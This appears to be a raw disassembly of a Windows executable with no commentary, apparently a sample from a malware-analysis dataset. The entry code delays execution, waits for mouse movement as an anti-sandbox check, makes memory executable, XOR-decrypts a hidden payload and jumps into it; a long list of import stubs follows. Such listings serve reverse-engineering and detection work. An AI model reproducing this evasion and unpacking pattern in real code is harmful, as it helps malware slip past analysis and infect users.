call SaveDC
nop
nop
nop
mov eax 0x203ee9d9
call sub_4026dc
mov esi eax
nop
nop
test esi esi
je r-xdata
push 0x0
call SaveDC
mov ebx 0x1
nop
lea eax [ ebx + 0x1 ]
and eax 0x7f
mov edx esi
add edx ebx
mov [ edx ] al
nop
nop
inc ebx
cmp ebx 0x203ecb4c
jne r-xdata
mov eax esi
call sub_4026fc
nop
nop
mov ebx 0x8c4d
push 0x0
call SaveDC
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
xor ebx ebx
push rw-data
call GetCursorPos
nop
push 0x0
push 0x27
call SleepEx
nop
cmp ebx 0x3
jbe r-xdata
nop
inc ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
push rw-data
call GetCursorPos
nop
nop
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x2e
jbe r-xdata
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_40511c
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
mov ecx 0x40
mov edx 0x5e08
mov eax [ rw-data ]
call [ rw-data ]
xor ebx ebx
mov eax [ rw-data ]
add eax ebx
mov al [ eax ]
nop
nop
xor al 0xb9
mov edx [ rw-data ]
add edx ebx
mov [ edx ] al
nop
inc ebx
cmp ebx 0x5e09
jne r-xdata
mov ebx 0x5f9
mov eax [ rw-data ]
add eax ebx
mov [ rw-data ] eax
nop
nop
mov ecx 0x2a7a
mov edx [ rw-data ]
mov eax 0x165f
call sub_4750c4
nop
jmp r-xdata
sub_4753dc
aas
add [ eax ] al
add ah ah
push ebx
inc edi
add [ edi + ebx * 2 + 0x40 ] bh
add [ edi + ebx * 2 + 0x40 ] cl
add [ eax + 0x5d ] dh
inc eax
add [ ebx * 2 + 0x5ff40040 ] bl
inc eax
add ah al
pop edi
inc eax
add [ ebp * 2 + 0x6cec0040 ] bl
inc eax
add [ ebp + ebp * 2 + 0x40 ] dl
add [ ebp * 2 + 0x55b00040 ] ah
inc ecx
add [ eax - 0x7bffbeab ] al
jo r-xdata
add ah ah
stosd [ edi ]
inc edx
add [ esi + eax * 8 + 0x42 ] dl
add [ esi + eax * 8 ] dl
inc edx
add [ esi + esi * 4 ] bl
inc edx
add ah ch
mov ch 0x42
add [ esi + ebp * 4 - 0x5193ffbe ] bl
inc edx
add [ eax + 0x7000421d ] ah
sbb eax 0xa8200042
inc edx
add [ edi + 0x42 ] cl
add [ eax - 0x44 ] dh
inc ebp
add [ eax - 0x44 ] al
inc ebp
add [ esi + esi * 4 + 0x42 ] bl
add [ esi + esi * 4 ] ch
inc edx
add [ edx ] ch
inc esi
add [ ecx - 0x346bffba ] bh
inc edx
add [ ebx + ecx * 8 + 0x42 ] ah
add [ edx * 8 - 0x2b17ffbe ] bh
inc edx
add [ eax + 0x700042d6 ] ah
salc
inc edx
add [ eax - 0x2a ] ch
inc edx
add [ eax ] bh
salc
inc edx
add [ eax ] dh
salc
inc edx
add [ eax ] al
salc
inc edx
add al bh
aad 0x42
add al cl
aad 0x42
add al bl
salc
inc edx
add [ eax - 0x73ffbd2a ] ch
inc ebx
add [ esi + edi + 0x43 ] bl
add [ eax + 0x69 ] cl
inc esp
add [ eax ] bl
imul eax [ eax + eax - 0x74 ] 0x5c0042c6
mov [ edx ] 0xd0
mov [ edx ] 0x94
mov [ edx ] 0x10
xlat
inc edx
add al ah
salc
inc edx
add [ eax - 0x29 ] cl
inc edx
add [ eax ] bl
xlat
inc edx
add [ eax + 0x240042dd ] al
fld [ edx ]
loopne r-xdata
add [ eax + esi * 2 + 0x40 ] dl
add [ eax - 0x29 ] dh
inc eax
add al dh
aad 0x40
add ah bl
fild [ eax ]
lodsb [ esi ]
fild [ eax ]
cld
inc ebp
inc ecx
add [ ebp + eax * 2 + 0x47c80041 ] al
inc ecx
add [ eax + 0x78004147 ] bl
push ebp
inc ecx
add [ eax ] ch
push ebp
inc ecx
add [ edx + ebx ] ch
inc edx
add [ ecx + ebx + 0x42 ] bh
add [ ecx + ebp * 4 + 0x42 ] bl
add [ ecx + ebp * 4 ] ch
inc edx
add [ esp + ebp * 4 ] dl
inc edx
add [ eax + 0x580042d5 ] cl
aad 0x42
add [ eax ] ch
cmp eax 0x3ce00043
inc ebx
add [ eax + 0x4800433d ] dl
cmp eax 0x3c680043
inc ebx
add [ eax ] dh
cmp al 0x43
add al al
cmp al 0x43
add [ eax + 0x5400433c ] dl
adc eax 0x15240043
inc ebx
add ah cl
adc al 0x43
add [ eax - 0x4fffbcec ] dl
push 0x44
add [ eax - 0x3ffbb96 ] al
cmp eax 0x3dac0043
inc ebx
add [ esi + edi + 0x43 ] dl
add [ esi + edi ] al
inc ebx
add [ eax + 0x5000430e ] al
push cs
inc ebx
add [ eax ] ah
mov [ ebx ] 0xa8
lds eax [ ebx ]
test al 0xd3
inc ebx
add [ ebx + edx * 8 + 0x43 ] ah
add ah dh
mov al [ ebp ]
mov [ edx - 0x5f4fffbb ] cs
inc ebp
add [ eax + 0x7c0045a0 ] al
ja r-xdata
inc ebx
add [ eax - 0x3fffbcf3 ] bl
aad 0x42
add [ eax - 0x77ffbd2b ] dl
aad 0x42
add [ eax - 0x2b ] bl
inc edx
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax sub_4753dc
call sub_405f08
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d124
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46d13c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d1bc
call sub_403e30
add [ edi + esi * 2 ] al
inc esp
add al ch
leave
inc edx
add [ eax - 0x7fffbd37 ] bh
out 0x46 al
add [ esi ] ah
inc esi
add [ eax - 0x77ffb8fe ] bh
add al [ edi ]
in al 0xc
inc edi
add [ esp + ecx + 0x367c0047 ] dh
inc edi
add [ esi + esi + 0x47 ] cl
add ah dl
dec ebp
inc edi
add [ ebp + ecx * 2 + 0x51400047 ] ah
inc edi
add [ eax ] dl
push ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 - 0x74aaffb9 ] dh
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_4753dc
call sub_405f08
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d124
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46d13c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d1bc
call sub_403e30
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405860
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405874
sub_40123c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40124c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_4012ac
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012cc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012ec
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40132c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ad2
jmp sub_403924
sub_401ad9
mov al [ rw-data ]
pop ebp
retn
sub_401bb6
jmp sub_403924
sub_401c84
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402298
retn
sub_402284
jmp sub_403924
sub_40242a
jmp sub_403924
sub_4026c9
jmp sub_403924
sub_40278c
call sub_405ebc
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405ebc
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e0
mov [ rw-data ] edx
call sub_403f08
sub_402844
push eax
push edx
push ecx
call sub_405ebc
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402838
retn
sub_402860
retn
sub_4028b4
retn
sub_4028b8
push ebx
call sub_405ebc
mov ebx [ eax + 0x4 ]
call sub_405ebc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402924
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402934
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029f4
mov edx [ eax + 0x1c ]
call sub_4029ac
retn
sub_402a87
retn
sub_402a88
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028d8
retn
sub_402c98
mov ecx 0xff
call sub_402ca4
retn
sub_402cc8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402ce4
jmp sub_402ce4
sub_402ce1
retn
sub_403071
jmp sub_403924
sub_4030c4
fninit
fwait
fldcw [ rw-data ]
retn
sub_40311c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403144
push ebx
mov ebx eax
mov eax ebx
call sub_4031f4
mov eax ebx
call sub_4026fc
pop ebx
retn
sub_403158
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403180
call sub_40355c
test dl dl
jle r-xdata
retn
call sub_403544
sub_403240
retn
sub_4032c8
jmp sub_403924
sub_4032cf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4033d8
mov eax 0x8000ffff
retn
sub_4033e0
retn
sub_4033e4
retn
sub_4033e8
retn
sub_40351d
jmp sub_403670
sub_403522
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403984
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403544
sub_403544
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40354c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40355c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40356c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403634
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403650
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a1d
retn
sub_403b60
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403bee
jmp sub_403670
sub_403c4e
jmp sub_403670
sub_403c68
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403b60
mov [ rw-data ] 0x0
call sub_403c08
retn
sub_403da1
retn
sub_403f03
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f08
mov [ rw-data ] eax
call sub_403e30
sub_404144
retn
sub_404180
retn
sub_40418e
retn
sub_4041a7
retn
sub_4041b8
retn
sub_40429f
retn
sub_4043d0
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4043ec#2
jmp sub_4043ec
sub_404435
retn
sub_40443d
retn
sub_40447f
retn
sub_4045d8
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
sub_4045f0
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404748
retn
sub_40475a
retn
sub_40475c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404984
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404a88
mov ecx 0x1
jmp sub_40499c
sub_404a92
retn
sub_404a94
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404cba
retn
sub_404cbc
mov al 0x11
jmp sub_402838
sub_404ce7
retn
sub_404f28
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404bc8
pop ebp
retn 0x4
j_sub_40499c
jmp sub_40499c
sub_404f3d
retn
sub_404f40
call sub_4050e0
retn
sub_40516c
call sub_405144
retn
sub_4054b5
jmp sub_403924
sub_405620
call sub_405630
retn
sub_405628
call sub_405650
retn
sub_405630
push ebx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4056eb
jmp sub_403670
sub_40570c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405780
jmp sub_403924
sub_405787
pop ecx
pop ebp
retn
sub_405800
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_40580c
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405818
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402838
sub_405828
call sub_403128
mov [ eax + 0x4 ] 0x1
retn
sub_405860
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405b4f
jmp sub_403924
sub_405b56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bf3
jmp sub_403924
sub_405bfa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c43
jmp sub_403924
sub_405c4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d0e
jmp sub_403924
sub_405d15
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405d66
jmp sub_403924
sub_405d6d
pop ebp
retn
sub_405e44
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405e64
push eax
push 0x40
call LocalAlloc
retn
sub_405e70
mov eax 0x10
retn
sub_405efc
mov eax rw-data
call sub_40570c
retn
sub_405f71
jmp sub_403924
sub_405f78
pop ebp
retn
sub_405f7c
sub [ rw-data ] 0x1
retn
sub_405f84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405fa0
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405fe9
jmp sub_403924
sub_405ff0
pop ebp
retn
sub_405ff4
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4062a0
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetClipRgn
jmp [ GetClipRgn@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsCharAlphaNumericA
jmp [ __import_lookup_table_9(user32:IsCharAlphaNumericA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBeep
jmp [ MessageBeep@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
OpenClipboard
jmp [ __import_lookup_table_9(user32:OpenClipboard) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
